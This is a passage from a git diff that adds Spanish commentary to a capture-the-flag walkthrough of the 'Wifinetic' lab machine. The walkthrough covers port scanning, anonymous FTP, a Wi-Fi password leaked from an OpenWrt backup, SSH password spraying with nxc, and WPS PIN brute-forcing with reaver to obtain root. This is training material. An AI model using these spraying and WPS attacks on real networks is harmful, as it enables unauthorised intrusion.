@@ -25,7 +25,9 @@ Usando herramientas estándar y con la interfaz inalámbrica proporcionada en mo
 
 ***
 
+## Reconnaissance
 
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Wifinetic**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.247 -oG allPorts
@@ -51,7 +53,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
            Raw packets sent: 66129 (2.910MB) | Rcvd: 65845 (2.634MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -64,7 +66,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado comprobamos que se encuentran abiertos el servicio SSH y FTP.
 
 ```bash
 ❯ nmap -sCV -p21,22,53 10.10.11.247 -A -oN targeted -oX targetedXML
@@ -116,7 +118,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -125,11 +127,13 @@ Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (277).png" alt=""><figcaption></figcaption></figure>
 
+## FTP Enumeration
 
+Accederemos al FTP autenticándonos con el usuario `anonymous` que en el escaneo con **Nmap** comprobamos que podíamos acceder. Al revisar el contenido del FTP, nos encontramos con varios archivos los cuales nos descargaremos en nuestro equipo local.
 
 ```bash
 ❯ ftp 10.10.11.247
@@ -151,18 +155,26 @@ ftp> ls
 ftp> mget *
 ```
 
+## Initial Access
 
+### Information Leakage
+
+Una vez descargado los archivos, nos montaremos un servidor web para visualizar el contenido de destos archivos a través del navegador.
 
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+En estos primeros archivos, no visualizamos ninguna información de suma importancia. Lo único destacable que podemos sacar es el nombre del usuario `samantha.wood93@wifinetic.htb`.
+
 <figure><img src="../../.gitbook/assets/imagen (281).png" alt=""><figcaption></figcaption></figure>
 
-
+Revisando los otros dos documentos que teníamos, solamente logramos sacar un nombre más de `olivia.walker17@wifinetic.htb`.
 
 <figure><img src="../../.gitbook/assets/4148_vmware_P4kpQxjBUu.png" alt=""><figcaption></figcaption></figure>
+
+También disponemos de un compromido llamado `backup-OpenWrt-2023-07-26.tar`. Descomprimiremos el archivo para visualizar el contenido que tiene el archivo. Revisando la estructura, parecen haber varios archivos de configuración y documentación interesante que deberemos investigar.
 
 ```bash
 ❯ ls -l backup-OpenWrt-2023-07-26.tar
@@ -208,7 +220,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 8 directories, 27 files
 ```
 
-
+Por un lado disponemos de un archivo llamado `passwd` el cual contiene nombres de uusarios. Estos usuarios nos lo guardaremos en un archivo `users.txt` para disponer de un listado de posibles usuarios.
 
 ```bash
 ❯ cat passwd
@@ -224,7 +236,7 @@ ubus:x:81:81:ubus:/var/run/ubus:/bin/false
 netadmin:x:999:999::/home/netadmin:/bin/false
 ```
 
-
+Revisandon los diferentes archivos de configuración, nos encontramos con el siguiente archivo en la siguiente ruta `etc/config/wireless` el cual contiene configuración de dispositivos Wireless. Entre la configuración nos aparece una contraseña.
 
 ```bash
 ❯ cat wireless
@@ -262,7 +274,7 @@ config wifi-iface 'wifinet1'
 	option key 'VeRyUniUqWiFIPasswrd1!'
 ```
 
-
+Probaremos de validar si estas credenciales sirven para algún usuario de los que disponemos. Verificamos que el usuario `netadmin` sí son válidas para acceder al SSH.
 
 ```bash
 ❯ nxc ssh 10.10.11.247 -u users.txt -p 'VeRyUniUqWiFIPasswrd1!' --continue-on-success
@@ -279,7 +291,7 @@ SSH         10.10.11.247    22     10.10.11.247     [-] ubus:VeRyUniUqWiFIPasswr
 SSH         10.10.11.247    22     10.10.11.247     [+] netadmin:VeRyUniUqWiFIPasswrd1!  Linux - Shell access!
 ```
 
-
+Comprobamos que podemos acceder correctamente al SSH y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ ssh netadmin@10.10.11.247
@@ -292,7 +304,15 @@ netadmin@wifinetic:~$ cat user.txt
 e86c726cda4********************
 ```
 
+## Privilege Escalation
 
+### Abusing an AP's WPS to get the root password (reaver)
+
+Revisando al usuario `netadmin` el cual disponemos de acceso, comprobamos que dispone de una `capabilitie` de `reaver`.
+
+{% hint style="info" %}
+**Reaver** es una herramienta de fuerza bruta diseñada para recuperar la contraseña **WPA/WPA2** de una red Wi-Fi aprovechando vulnerabilidades en la implementación de **WPS (Wi-Fi Protected Setup)**. Es útil cuando el WPS está habilitado en el router, ya que permite a los atacantes explotar este protocolo para acceder a la red inalámbrica sin necesidad de capturar tráfico.
+{% endhint %}
 
 ```bash
 netadmin@wifinetic:~$ getcap -r / 2>/dev/null
@@ -301,11 +321,12 @@ netadmin@wifinetic:~$ getcap -r / 2>/dev/null
 /usr/bin/mtr-packet = cap_net_raw+ep
 /usr/bin/traceroute6.iputils = cap_net_raw+ep
 /usr/bin/reaver = cap_net_raw+ep
+
 netadmin@wifinetic:~$ which reaver | xargs ls -l
 -rwxr-xr-x 1 root root 818808 May 17  2018 /usr/bin/reaver
 ```
 
-
+Revisamos que efectivamente podemos ejecutar el binario de `reaver` sin problemas.
 
 ```bash
 netadmin@wifinetic:~$ reaver
@@ -353,9 +374,7 @@ Example:
 	reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv
 ```
 
-
-
-
+Revisamos las interfaces de red que disponía el equipo y comprobamos que hay una llamada `mon0` que parece ser de monitorización por el nombre.
 
 ```bash
 netadmin@wifinetic:~$ ifconfig
@@ -411,7 +430,7 @@ wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-
+El comando iw dev en Linux se utiliza para mostrar las interfaces inalámbricas disponibles en tu sistema y la información asociada a ellas. Entre la información recopilada, nos encontramos que hay una interfaz que actúa como AP (wlan0) y otra como cliente (wlan1)
 
 ```bash
 netadmin@wifinetic:~$ iw dev
@@ -453,7 +472,7 @@ phy#0
 		txpower 20.00 dBm
 ```
 
-
+A través de `reaver` realizaremos un ataque de fuerza bruta sobre el AP para encontrar la contraseña WPA/WPA2 del AP. Verificamos que hemos logrado obtener la contraseña del AP.
 
 ```bash
 netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv
@@ -488,7 +507,7 @@ Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetso
 [+] Nothing done, nothing to save.
 ```
 
-
+Probaremos de acceder con estas nuevas credenciales al usuario `root` y comprobamos que podemos acceder y visualizar la flag de **root.txt**.
 
 ```bash
 netadmin@wifinetic:~$ su root
